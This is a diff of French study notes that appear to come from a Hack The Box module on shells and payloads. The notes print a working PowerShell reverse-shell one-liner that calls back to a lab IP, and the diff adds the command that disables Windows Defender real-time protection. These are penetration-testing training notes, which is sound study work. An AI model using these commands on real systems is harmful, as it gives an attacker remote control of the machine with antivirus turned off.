@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T19:23:09.013Z
+date: 2025-05-17T19:25:57.488Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -174,4 +174,12 @@ Voici un exemple de client Powershell (ou payload) "One-liner" permettant d'init
 
 ```
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Cependant ce payload a de grandes chances d'être bloqué par un antivirus (Windows Defender ou autre)
+
+Pour désactiver la protection en temps réel de Windows Defender:
+
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
 ```
